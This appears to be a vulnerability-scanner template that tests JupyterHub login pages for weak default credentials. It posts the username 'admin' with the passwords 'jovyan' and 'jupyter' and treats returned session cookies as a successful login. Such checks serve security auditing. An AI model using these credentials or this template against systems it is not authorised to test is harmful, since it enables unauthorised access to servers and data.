id: poc-yaml-jupyterhub-dashboard-weak-password
info:
  name: JupyterHub Dashboard Weak Password
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
http:
  - method: POST
    path:
      - "{{BaseURL}}/hub/login?next="
    headers:
      Content-Type: application/x-www-form-urlencoded
    payloads:
      username:
        - admin
      password:
        - jovyan
        - jupyter
    attack: pitchfork
    body: "username={{username}}&password={{password}}"
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "jupyterhub-session-id="
      - type: word
        part: header
        words:
          - "jupyterhub-hub-login="
